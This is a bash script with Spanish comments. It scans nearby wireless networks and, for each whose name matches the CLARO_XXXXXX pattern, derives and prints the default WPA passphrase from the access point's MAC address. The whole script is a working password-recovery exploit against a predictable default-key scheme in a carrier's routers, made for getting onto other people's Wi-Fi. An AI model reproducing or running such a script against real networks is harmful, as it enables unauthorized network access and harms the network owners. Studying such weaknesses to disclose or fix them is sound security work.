#!/bin/bash
num=0
clr=0
b16='0x'
#regex que hace match con los ESSID afectados
pat="^CLARO_[[:xdigit:]]{6}$"

#obtenemos interfaz inalambrica y escaneamos
iwconfig &> /tmp/wnics;
int=$(cat /tmp/wnics |grep -v 'no wireless extensions\|^[[:space:]]'| awk '{print $1}'|sort -r);
iwlist $int scan |grep 'Cell\|ESSID' &> /tmp/wlans;

# numero de redes encontradas
num=$(wc -l /tmp/wlans|awk '{print $1}');
num=`expr $num / 2`;

for i in `seq 1 $num`;
 do
	exec < /tmp/wlans;
	# leemos BSSID de cada red
		read a1;
		mac=$(echo $a1|awk '{print $5}');
	# leemos ESSID
		read a2;
		nom=$(echo $a2|cut -c8- |cut -d\" -f1);
	# comparamos ESSID con patrón 
		if [[ $nom =~ $pat ]]
		then
	# si hace match quita el primer y ultimo hexadecimal
	# del BSSID y agrega el ultimo despues de restarle uno ;) 
			clr=1
			pre=$(echo $mac|cut -c4-|sed "s/://g"|rev|cut -c3-|rev)
			suf=$(echo $mac|cut -c16-)
			echo '+------------------------+';
			echo "|" ESSID: $nom  "   |"
			hex=$(($b16$suf-0x01));
			hex=$(printf "%X\n" $hex);
			echo "|" passphrase: $pre$hex "|"
			echo '+------------------------+';
		fi
		
		sed -i -e "1d" /tmp/wlans
		sed -i -e "1d" /tmp/wlans
 done

if [[ $clr == "0" ]]
then
	echo "No se encontraron redes con patron CLARO_*"
fi

rm /tmp/wnics /tmp/wlans
